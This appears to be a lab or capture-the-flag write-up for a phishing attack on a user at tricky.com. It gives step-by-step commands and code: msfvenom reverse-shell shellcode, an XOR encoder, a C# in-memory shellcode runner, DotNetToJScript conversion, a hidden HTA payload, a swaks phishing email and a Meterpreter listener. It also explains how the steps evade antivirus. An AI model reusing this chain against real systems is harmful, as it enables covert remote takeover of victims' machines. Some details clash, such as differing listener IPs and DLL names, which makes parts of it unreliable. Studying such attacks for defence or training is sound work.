

# Full Writeup: DotNetToJScript HTA Phishing Attack

## Overview

**Target:** [will@tricky.com](mailto:will@tricky.com) (CLIENT09) **Attack Vector:** Email phishing with HTA payload **Payload:** XOR-encoded shellcode via DotNetToJScript **Result:** Meterpreter shell as `tricky\will`
## Phase 1: Generate Shellcode (Kali)

### Step 1.1: Create shellcode

```bash
cd ~/Documents/challenge4
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.151 LPORT=443 EXITFUNC=thread -f csharp > shellcode.txt
```
### Step 1.2: Create XOR encoder

```bash
cat > xor_encoder.py << 'EOF'
#!/usr/bin/env python3

KEY = 0xfa

# Paste your shellcode bytes here from shellcode.txt
buf = bytearray([
    # PASTE ALL BYTES FROM shellcode.txt HERE
    # Example: 0xfc,0x48,0x83,0xe4,0xf0,0xe8,...
])

# XOR encode
encoded = []
for b in buf:
    encoded.append(hex(b ^ KEY))

# Output C# format
output = "byte[] buf = new byte[] {\n"
for i, b in enumerate(encoded):
    output += b
    if i < len(encoded) - 1:
        output += ","
    if (i + 1) % 15 == 0:
        output += "\n"
output += "\n};"

print(output)
print(f"\n// XOR Key: {hex(KEY)}")
print(f"// Original size: {len(buf)} bytes")
EOF
```
### Step 1.3: Edit encoder with your shellcode
```bash
vim xor_encoder.py
# Paste the bytes from shellcode.txt into the buf array
```
### Step 1.4: Run encoder
```bash
python3 xor_encoder.py > encoded_shellcode.txt
cat encoded_shellcode.txt
```
## Phase 2: Create C# DLL (Windows VM)

### Step 2.1: Create Visual Studio Project

1. Open **Visual Studio**
2. Click **Create a new project**
3. Select: **Class Library (.NET Framework)** → **C# | Library | Windows**
4. Project name: `ClassLibrary1`
5. Framework: **.NET Framework 4.0**
6. Click **Create**
### Step 2.2: Replace Class1.cs code

Delete all content in `Class1.cs` and replace with:

csharp
```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        // PASTE YOUR XOR-ENCODED SHELLCODE FROM encoded_shellcode.txt
        byte[] buf = new byte[] {
            0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,
            // ... rest of encoded bytes ...
        };

        // XOR decrypt with key 0xfa
        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```
### Step 2.3: Enable COM Visibility

1. **Solution Explorer** → Right-click project → **Properties**
2. Go to **Application** tab
3. Click **Assembly Information**
4. Check ☑ **Make assembly COM-Visible**
5. Click **OK**
### Step 2.4: Build DLL

1. Set configuration to **Release** (dropdown at top)
2. **Build** → **Build Solution** (Ctrl+Shift+B)
3. Verify output: `C:\Users\Administrator\Source\Repos\ClassLibrary1\ClassLibrary1\bin\Release\ClassLibrary1.dll`
## Phase 3: Convert DLL to JScript (Windows VM)

### Step 3.1: Setup SMB share on Kali
```bash
cd ~/Documents/challenge4
sudo impacket-smbserver share $(pwd) -smb2support -username kali -password kali
```
### Step 3.2: Connect from Windows and copy files

```cmd
net use \\192.168.45.151\share /user:kali kali
copy C:\Users\Administrator\Source\Repos\ClassLibrary1\ClassLibrary1\bin\Release\ClassLibrary1.dll \\192.168.45.151\share\
```
### Step 3.3: Run DotNetToJScript
```cmd
cd \\192.168.45.151\share
.\DotNetToJScript.exe ClassLibrary2.dll --lang=Jscript --ver=v4 -o runner.js -c TestClass
```
### Step 3.4: Verify output
```cmd
dir runner.js
```
Should show ~10KB file.
## Phase 4: Create HTA Payload (Kali)

### Step 4.1: Create HTA wrapper
```bash
cat > runner.hta << 'EOF'
<html>
<head>
<HTA:APPLICATION ID="Test" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script language="JScript">
EOF

cat runner.js >> runner.hta

cat >> runner.hta << 'EOF'
self.close();
</script>
</head>
<body>
</body>
</html>
EOF
```
### Step 4.2: Verify HTA
```bash
head -10 runner.hta
tail -10 runner.hta
```
## Phase 5: Deliver Payload

### Step 5.1: Start listener (Terminal 1)

````bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.204; set LPORT 443; set EXITFUNC thread; set AutoRunScript post/windows/manage/migrate; run"
```

Wait for:
```
[*] Started reverse TCP handler on 192.168.45.151:443
````
### Step 5.2: Start web server (Terminal 2)
```bash
cd ~/Documents/challenge4
python3 -m http.server 80
```
### Step 5.3: Send phishing email (Terminal 3)
````bash
swaks -t will@tricky.com -f tickets@tricky.com --body "Click here: http://192.168.45.204/runner.hta" --server 192.168.178.159 --header "Subject: Mail system issues"
```

---

## Phase 6: Catch Shell

### Expected output in Terminal 1:
```
[*] Sending stage (201798 bytes) to 192.168.164.159
[*] Session ID 1 (192.168.45.151:443 -> 192.168.164.159:63431) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against CLIENT09
[*] Current server process: mshta.exe (1588)
[*] Spawning notepad.exe process to migrate into
[*] Migrating into 4904
[+] Successfully migrated into process 4904
[*] Meterpreter session 1 opened (192.168.45.151:443 -> 192.168.164.159:63431)
meterpreter >
````
### Verify access:
```bash
meterpreter > shell
whoami
# Output: tricky\will
```
## Key Settings Summary

| Component          | Value                                           |
| ------------------ | ----------------------------------------------- |
| msfvenom payload   | `windows/x64/meterpreter/reverse_tcp`           |
| msfconsole payload | `windows/x64/meterpreter/reverse_tcp`           |
| LHOST              | 192.168.45.151                                  |
| LPORT              | 443                                             |
| EXITFUNC           | thread                                          |
| AutoRunScript      | `post/windows/manage/migrate`                   |
| XOR Key            | 0xfa                                            |
| DotNetToJScript    | `--lang=Jscript --ver=v4 -c TestClass`          |
| VS Project         | Class Library (.NET Framework 4.0), COM-Visible |
## Why It Worked

1. **XOR encoding** - Evades static AV signatures
2. **DotNetToJScript** - Executes C# in memory via JScript
3. **HTA delivery** - mshta.exe is trusted Windows binary
4. **AutoRunScript migrate** - Moves out of mshta.exe before AV kills it
5. **x64 payload** - Matches target architecture
## Files Created

|File|Location|Purpose|
|---|---|---|
|shellcode.txt|Kali|Raw msfvenom output|
|xor_encoder.py|Kali|XOR encoding script|
|encoded_shellcode.txt|Kali|XOR-encoded shellcode|
|ClassLibrary1.dll|Windows VM|Compiled C# shellcode runner|
|runner.js|Kali (via SMB)|DotNetToJScript output|
|runner.hta|Kali|Final payload served via HTTP|
